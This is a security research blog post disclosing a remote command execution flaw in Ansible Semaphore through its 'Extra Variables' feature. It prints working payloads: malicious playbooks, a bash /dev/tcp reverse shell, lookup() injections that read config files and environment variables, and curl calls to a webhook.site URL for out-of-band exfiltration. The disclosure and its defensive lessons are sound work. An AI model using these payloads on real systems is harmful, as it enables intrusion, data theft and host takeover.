---
title: "A Quick Story Of Security Pitfalls With Exec.Command In Software Integrations"
author: Alevsk
type: post
date: 2023-07-01T00:41:33+00:00
url: /2023/07/a-quick-story-of-security-pitfalls-with-execcommand-in-software-integrations/
categories:
  - Ansible
  - Homelab
  - Security
  - Research
  - Automation
tags:
  - Ansible
  - Homelab
  - Security
  - Research
  - Automation
images:
  - /images/ansible-semaphore.jpg
---

![Ansible Semaphore](/images/ansible-semaphore.jpg)

> This vulnerability has been reported to <https://www.cve.org/> and a CVE has been assigned 🎉. [Read about CVE-2023-39059](#cve-report-cve-2023-39059)

In this article, I aim to talk about an interesting open-source project that I came across a couple of weeks ago while making some upgrades in my home lab. This project caught my attention and turned into the main subject of my weekend security research.

- [Introduction](#introduction)

- [Preparation](#preparation)

- [Hunting for vulnerabilities](#hunting-for-vulnerabilities)

- [Ansible Security](#ansible-security)

- [Data Exfiltration Using The Extra Variables Feature](#data-exfiltration-using-the-extra-variables-feature)

- [Final Thoughts](#final-thoughts)

## Introduction

As I mentioned in my previous post, I heavily rely on Ansible for automating tasks in my home lab. I've accumulated dozens of scripts to automate various actions I repeatedly perform on my virtual machines, which can sometimes become disorganized. I started exploring best practices and tools that could simplify my workflow, and that's when I discovered Ansible Semaphore. Ansible Semaphore is a user-friendly interface for Ansible that allows for the streamlined execution of Ansible playbooks. It also provides notifications on task failures and facilitates access control for deployment systems. After spending time reading about and familiarizing myself with the project, it appeared to be an excellent solution for managing my home lab infrastructure.

As I continued using it over a few days, questions about the security of Ansible Semaphore naturally surfaced in my mind. Given the tool’s capabilities in managing infrastructure, it could be an appealing target for attackers. I probed to see if Ansible Semaphore was susceptible to common web application vulnerabilities such as SQL Injection (SQLi) or Cross-Site Scripting (XSS), but didn't find any issues.

Nonetheless, the project description mentions that Ansible Semaphore allows for the easy execution of Ansible playbooks. This implies the possibility of remote code execution through the tool. With this in mind, I delved into the source code and began examining how Ansible was integrated within the project.

## Preparation

In preparing for this research, it was essential for me to run and debug the code locally. I found that the developers had done an exemplary job in providing instructions on setting up the development environment for Ansible Semaphore, which can be found here: https://github.com/ansible-semaphore/semaphore/blob/develop/CONTRIBUTING.md.

As I proceeded with setting up my local development environment, I concentrated on accomplishing the following tasks:

- Cloning the repository to my local machine.
- Compiling and executing the project locally.
- Running the project using Visual Studio Code (Vscode).
- Being able to debug and set breakpoints within Vscode.

## Hunting For Vulnerabilities

I spent quite a bit of time looking for SQL Injection vulnerabilities but didn’t find any. The developers did a really good job cleaning up every single parameter that interacts with the database. Next, I turned my attention to how Ansible Semaphore actually runs the Ansible playbooks. I found out it directly calls the `ansible-playbook` binary using `exec.Command` in Go. The use of 'exec' by itself is something to be cautious of when looking into security, so I kept looking into it.

![Debugging environment using vscode](/images/vscode_semaphore_debugging.png)

The exec package is quite effective in preventing **command** injection vulnerabilities. Unless the attacker has control over the command parameter (which is not the situation here), command injection using only the **args** parameter is not feasible.

After this, I changed my approach to try and find if there was any way to misuse the `ansible-playbook` application itself, and in doing so, I ventured into the realm of Ansible security.


## Ansible Security

There are already well-established techniques for misusing ansible playbooks. A good starting point is https://gtfobins.github.io/gtfobins/ansible-playbook/. For example, if you run the following code snippets on a computer where Ansible is installed, the ansible-playbook command will initiate an interactive shell and make an HTTP request to a remote host, in that sequence.


### Interactive Shell

```bash
TF=$(mktemp)
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
ansible-playbook $TF
```

### Server-Side Request Forgery (SSRF)

```bash
TF=$(mktemp)
echo '[{hosts: localhost, tasks: [shell: curl https://webhook.site/22cbe5dd-bcc8-400c-8097-71f166629b25 </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
ansible-playbook $TF
```

With this knowledge, I can create the following malicious playbooks. When they are run directly from Ansible Semaphore, they let you read sensitive files on the server, make requests as the host, and even get a reverse shell.

### ssrf.yaml
```yaml
[{hosts: localhost, tasks: [shell: curl https://webhook.site/22cbe5dd-bcc8-400c-8097-71f166629b25 </dev/null >/dev/null 2>/dev/null]}]
```

### passwd.yaml

```yaml
- hosts: localhost
  tasks:
    - name: Show passwd file
      command: "cat /etc/passwd"
```

### reverse-shell.yaml

```yaml
[{hosts: localhost, tasks: [shell: bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/1337 <&1']}]
```

However, for an attacker to be able to do this, they first need to have access to the repository from which Ansible Semaphore loads the scripts, and that's not always possible.

## Data Exfiltration Using The Extra Variables Feature

Ansible Semaphore includes a feature called "Extra Variables." This feature can be accessed at `https://<semaphore-endpoint>/project/id/environment` and is directly associated with the ansible-playbook `--extra-vars` flag.

![Extra Variables feature on semaphore](/images/semaphore_extra_vars.png)

Ansible extra variables are variables that can be fed into an Ansible playbook during runtime. They can serve to override default values or supply additional information that the playbook does not contain. Extra variables can be passed through the command line or within a YAML file.

To input extra variables via the command line, the `--extra-vars` or `-e` option can be utilized. For instance: `ansible-playbook playbook.yml --extra-vars "var1=value1 var2=value2"`

The `--extra-vars` parameter is something that we, as attackers, can manipulate and potentially exploit. Here are a few examples I found that allow a malicious user to read files and configurations, perform Server Side Request Forgery (SSRF), execute commands, and establish a reverse shell.

### Retrieving Ansible Semaphore config path via environment variable

```json
{
  "date": "{{ lookup('env', 'SEMAPHORE_CONFIG_PATH') }}"
}
```

### Retrieving Ansible semaphore configuration

```json
{
  "date": "{{ lookup('file', '~/semaphore/config.json') }}"
}
```

![lookup file](/images/lookup_file.png)

### Server-side request forgery, retrieving data from remote server

```json
{
  "date": "{{ lookup('url', 'https://google.com/') }}"
}
```

![lookup url](/images/lookup_url.png)

### Retrieving environment variables

```json
{
  "date": "{{ lookup('ansible.builtin.pipe', 'env') }}"
}

```

### Out of Band Exploitation (OOB)

```json
{
  "ansible_user": "{{ lookup('ansible.builtin.pipe', \"curl https://webhook.site/22cbe5dd-bcc8-400c-8097-71f166629b25/whoami \") }}"
}

```

![lookup url](/images/oob.png)

### Reverse shell

Ansible provides several variables that are always available and can be overridden using the --extra-vars parameter.

- ansible_user
- ansible_password
- ansible_ssh_private_key_file
- ansible_become_pass
- ansible_port
- ansible_host
- ansible_python_interpreter
- ansible_connection
- ansible_ssh_common_args
- ansible_sudo_pass

```json
{
  "ansible_user": "{{ lookup('ansible.builtin.pipe', \"bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/1337 <&1'\") }}"
}
```

{{< youtube pKvu7tEOoS8 >}}

The vulnerability is present due to two reasons:

- `ansible-playbook` permits code execution by design through the `extra-vars` flag, and this doesn’t appear to be documented anywhere (please correct me if I'm mistaken).
- Ansible Semaphore takes input directly from the user and feeds it to the args parameter in `exec.Command(command, args...)` without applying any kind of sanitization or filtering.

By taking advantage of this vulnerability, a malicious user could escalate privileges, gain control of the host, and potentially all other machines managed by Ansible Semaphore.

## Final Thoughts

The utilization of `exec.Command` for invoking external binaries can provide powerful functionality, but it also exposes potential security risks if not handled with care, as seen in the case of Ansible Semaphore with ansible-playbook. It is imperative that developers consider security implications. Input validation and sanitization are critical to mitigate risks such as command injection vulnerabilities. Furthermore, it is advisable to be familiar with the documentation and understand the nature of the programs being integrated.

## CVE Report (CVE-2023-39059)

- **CVE ID**: `CVE-2023-3905`
- **Product**: [ansible semaphore](https://github.com/ansible-semaphore/semaphore)
- **Affected version**: [ansible semaphore v2.8.90](https://github.com/ansible-semaphore/semaphore/releases/tag/v2.8.90)
- **Description**: An issue in ansible `semaphore v.2.8.90` allows a remote attacker to execute arbitrary code via a crafted payload to the extra variables parameter.
- **Vulnerability Type**: Remote Command Execution (RCE)
- **Root Cause**: Ansible Semaphore includes a feature called "Extra Variables." This feature can be accessed at `https://<semaphore-endpoint>/project/id/environment` and is directly associated with the ansible-playbook `--extra-vars` flag.
- **Impact**: The `--extra-vars` parameter can be abused by a malicious user with low privileges to achieve Remote Command Execution (RCE) and read files and configurations, perform Server Side Request Forgery (SSRF), execute commands, and establish a reverse shell on the ansible server.

Happy hacking
